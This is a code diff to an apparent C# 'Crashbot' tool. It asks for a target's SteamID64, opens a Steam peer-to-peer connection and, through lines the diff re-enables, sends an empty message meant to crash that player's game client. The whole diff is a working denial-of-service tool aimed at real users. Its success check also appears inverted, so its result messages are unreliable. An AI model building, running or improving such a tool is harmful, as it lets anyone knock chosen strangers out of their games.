@@ -22,35 +22,28 @@ namespace Crashbot
                 Debug.WriteLine("SteamAPI.Init() failed!");
                 return;
             }
-            else
-            {
-                Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
-                Console.WriteLine("SteamID: " + Steamworks.SteamUser.GetSteamID());
-            }
 
             Console.WriteLine("76561198299556567");
 
             start:
 
+            Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
             Console.Write("Enter target SteamID64: ");
-            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
 
+            ulong target = ulong.Parse(Console.ReadLine()?.Trim() ?? "0");
             var steamuser = new SteamKit2.SteamID(target);
             CSteamID cSteamID = new(steamuser.ConvertToUInt64());
-            Console.WriteLine($"Targeting [{cSteamID.m_SteamID}]");
 
             SteamNetworkingIdentity remoteIdentity = new();
             remoteIdentity.SetSteamID(cSteamID);
 
-            Console.WriteLine("BLoggedOn: " + Steamworks.SteamUser.BLoggedOn());
-
             SteamNetworkingConfigValue_t[] options = new SteamNetworkingConfigValue_t[1];
             options[0].m_eDataType = ESteamNetworkingConfigDataType.k_ESteamNetworkingConfig_Int32;
             options[0].m_eValue = ESteamNetworkingConfigValue.k_ESteamNetworkingConfig_TimeoutConnected; // or another relevant option
-            options[0].m_val.m_int32 = 100;
+            options[0].m_val.m_int32 = 50;
 
             HSteamNetConnection conn = SteamNetworkingSockets.ConnectP2P(ref remoteIdentity, 0, 1, options);
-            Console.WriteLine("Init connection...");
+            Console.WriteLine("Connecting...");
 
             Thread.Sleep(10);
             Steamworks.SteamAPI.RunCallbacks();
@@ -76,8 +69,8 @@ namespace Crashbot
 
                 if (messageCount > 0)
                 {
-                    //Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
-                    //Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn);
+                    Steamworks.SteamNetworkingSockets.SendMessageToConnection(conn, 0, 0, 0, out long _);
+                    Steamworks.SteamNetworkingSockets.FlushMessagesOnConnection(conn);
                     Console.WriteLine("Crashing client...");
                     Steamworks.SteamAPI.RunCallbacks();
                     Steamworks.SteamNetworkingSockets.RunCallbacks();
@@ -90,7 +83,6 @@ namespace Crashbot
                 }
             }
 
-            bool crashed = false;
             int timeout = 100;
             Steamworks.SteamNetworkingSockets.GetConnectionInfo(conn, out info);
             while (info.m_eState == ESteamNetworkingConnectionState.k_ESteamNetworkingConnectionState_Connected)
@@ -107,7 +99,8 @@ namespace Crashbot
 
             Console.WriteLine(timeout);
             Console.WriteLine(JsonConvert.SerializeObject(info, Formatting.Indented));
-            
+
+            bool crashed = timeout > 0;
             Console.WriteLine(crashed ? "Failed to Crash" : "Successfully Crashed!");
             Steamworks.SteamNetworkingSockets.CloseConnection(conn, 0, "\0", false);
 
